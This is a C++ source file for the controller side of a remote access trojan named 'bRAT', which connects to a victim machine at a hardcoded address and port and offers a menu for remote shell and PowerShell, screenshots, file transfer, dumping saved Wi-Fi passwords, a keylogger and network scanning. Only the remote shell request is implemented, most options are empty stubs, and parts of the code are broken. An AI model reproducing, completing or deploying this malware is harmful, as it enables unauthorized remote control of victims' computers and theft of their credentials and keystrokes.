#include <stdio.h>
#include "helpers.h"

#ifdef _WIN32
#include <WinSock2.h>
#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#define timeSleep 10000
#endif

#ifdef __linux__
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#define IPPROTO_TCP 0
#endif

class Attacker {
    std::string ipAddr;
    int port;
    static bool hasConnection;
    static int hasBeenCreated;
    SOCKET clientSock;
    char buffer[];

    void clearBuffer(){
        memset(this->buffer, NULL, BUFFER_LENGTH);
    }
    bool sendData(std::string buffer){
        int iSend = send(this->clientSock, buffer.c_str(), buffer.size() + 1, 0);
        if (iSend <= SOCKET_ERROR) {
            std::cout << "[!] Unable to send data to server " << ipAddr << " on port " << port << std::endl;
        #ifdef _WIN32
            std::cout << "[!] Error: " << WSAGetLastError() << std::endl;
        #endif
            return false;
        }
        return true;
    }
    bool recvData(){
        int iRecv = recv(clientSock, buffer, BUFFER_LENGTH, 0);
        if (iRecv <= SOCKET_ERROR) {
            std::cout << "[!] Unable to receive data from server " << ipAddr << " on port " << port << std::endl;
            hasBeenCreated--;
        #ifdef _WIN32
            std::cout << "[!] Error: " << WSAGetLastError() << std::endl;
        #endif
            clearBuffer();
            return false;
        }
        return true;
    }
    int displayMenu(){
        int uChoice;
        std::cout << "[x] Following features exist (so far) in bRAT:\n\n";
        std::cout << "1. Get a shell (Note: Some commands like cd, will not work.)\n";
        std::cout << "2. Get a powershell\n";
        std::cout << "3. Dump system info\n";
        std::cout << "4. Get a live screenshot.\n";
        std::cout << "5. Upload file.\n";
        std::cout << "6. Download file.\n";
        std::cout << "7. Dump saved Wi-Fi passwords.\n";
        std::cout << "8. Enable keylogger (Beta)\n";
        std::cout << "9. Scan local network\n";
        std::cout << "0. Exit\n\n";
        std::cout << "> Enter choice: ";
        std::cin >> uChoice;
        while(uChoice <= 0 || uChoice > 9){
            std::cin.clear();
            std::cin.ignore(INT_MAX, '\n');
            std::cout << "[!] Invalid Choice. Try again: ";
            std::cin >> uChoice;
        }
        return uChoice;
    }
public:
    Attacker(std::string ipAddr = "127.0.0.1", int port = 6969) : ipAddr(ipAddr), port(port), clientSock(INVALID_SOCKET)
    { }

    void setPort(int port) { this->port = port; }
    void setIPAddress(std::string ipAddr) { this->ipAddr = ipAddr; }

    SOCKET getSocket() {
        #ifdef _WIN32
                WSADATA wsaData;
                int iStart = WSAStartup(MAKEWORD(2, 2), &wsaData);
                if (iStart != NULL) {
                    std::cout << "[!] WSAStartup Failed. Error: " << WSAGetLastError() << std::endl;
                    system("pause");
                    return INVALID_SOCKET;
                }
        #endif
                // Create Socket
                auto clientSock = socket(AF_INET, SOCK_STREAM, 0);
                if (clientSock == INVALID_SOCKET) {
                    std::cout << "[!] Unable to create socket.\n";
        #ifdef _WIN32
                    std::cout << "[!] Error: " << WSAGetLastError() << std::endl;
                    closesocket(clientSock);
                    WSACleanup();
        #endif
            return INVALID_SOCKET;
        }

        // Fill in the hint structure.
        // Hint tells the server where to connect to.
        sockaddr_in hint;
        hint.sin_family = AF_INET;
        hint.sin_port = htons(port);
        inet_pton(AF_INET, ipAddr.c_str(), &hint.sin_addr);

        // Connecting to the server.
        int iConnect = connect(clientSock, (sockaddr*)&hint, sizeof(hint));
        if (iConnect == SOCKET_ERROR) {
            std::cout << "[!] Unable to connect to server " << ipAddr << " on port " << port << std::endl;
#ifdef _WIN32
            std::cout << "[!] Error: " << WSAGetLastError() << std::endl;
            closesocket(clientSock);
            WSACleanup();
#endif
            return INVALID_SOCKET;
        }
        return clientSock;
    }

    bool establishConnection(){
        if (hasBeenCreated)
            std::cout << std::endl << std::endl;
        std::cout << "[+] Trying to connect to " << this->ipAddr << ":" << this->port << "...\n";
        hasBeenCreated++;
        clientSock = getSocket();
        if (clientSock == INVALID_SOCKET){
            hasBeenCreated--;
            return false;
        }
        if (!hasConnection || !hasBeenCreated)
            std::cout << "[*] Connected to server: " << ipAddr << ":" << port << std::endl;
        hasConnection = true;
        return true;
    }

    void invokeShell(bool ps=false){
        const char* cmd = "GET shell";
        if(!sendData(cmd)){
            std::cout << "[!] Unable to invoke shell!\n";
            return;
        }
        if(!recvData()){
            std::cout << "[!] Unable to receive data from server. Try re-establishing connection by restarting the RAT.\n";
            return;
        }
        std::cout << "[=] Spawned Shell. To exit shell, type shellexit\n.[*] Note: If no output is returned, that means the command doesn't exist or an error has occurred. I didn't include the returning of stderr from the victim.\n\n";
        char* shell = buffer;
        printf("%s", shell);
    }
    void dumpsysinfo(){}
    void getBanner(){
        if(clientSock == INVALID_SOCKET){
            std::cout << "[!] No connection established!\n";
            return;
        }
        std::cout << "[*] Fetching system info\n";
        recvData();
        printf("%s", buffer);
        int uChoice = displayMenu();
        do{
            switch(uChoice){
                case 0:
                std::cout << "You chose to exit!\n";
                closesocket(clientSock);
            // std::cout << "1. Get a shell (Note: Some commands like cd, will not work.)\n\n";
            // std::cout << "2. Get a powershell\n";
            // std::cout << "3. Dump system info\n";
            // std::cout << "4. Get a live screenshot.\n";
            // std::cout << "5. Upload file.\n";
            // std::cout << "6. Download file.\n";
            // std::cout << "7. Dump saved Wi-Fi passwords.\n";
            // std::cout << "8. Enable keylogger (Beta)\n";
            // std::cout << "9. Scan local network\n";
            // std::cout << "0. Exit\n\n";
                exit(0);
                    break;
                case 1:
                invokeShell();
                    break;
                case 2:
                invokeShell(true);
                    break;
                case 3:
                dumpsysinfo();
                    break;
                case 4:
                    break;
                case 5:
                    break;
                case 6:
                    break;
                case 7:
                    break;
                case 8:
                    break;
                case 9:
                    break;
            }
        }while(uChoice != 0);
    }

//     bool run() {
//         char buffer[BUFFER_LENGTH] = { 0 };
//         std::string uInput = "";
//         printf("%s", buffer);
//         std::getline(std::cin, uInput);
//         while (uInput.size() < 0) {
//             std::cout << "[!] Invalid input. Try again: ";
//             std::getline(std::cin, uInput);
//         }
//         iRecv = 0;
//         iRecv = recv(clientSock, buffer, BUFFER_LENGTH, 0);
//         if (iRecv > 0)
//             printf("%s", buffer);

// #ifdef _WIN32
//         WSACleanup();
// #endif
//         closesocket(clientSock);
//     }
};

bool Attacker::hasConnection = false;
int Attacker::hasBeenCreated = 0;

void connect(std::string& ipAddr, int& port) {
    std::cout << "[*] Enter the IP Address you want to connect to: ";
    std::getline(std::cin, ipAddr);
    std::cin.clear();
    std::cout << "[*] Enter the port number of the server you want to connect to: ";
    std::cin >> port;
}


int main() {

    std::string ip = "192.168.0.101";
    // std::string ip = "127.0.0.1";
    int port = 6969;
    //connect(ip, port);
    Attacker* attacker = new Attacker(ip, port);

    while (true) {
        if(attacker->establishConnection())
            attacker->getBanner();
        Sleep(timeSleep);
    }
}
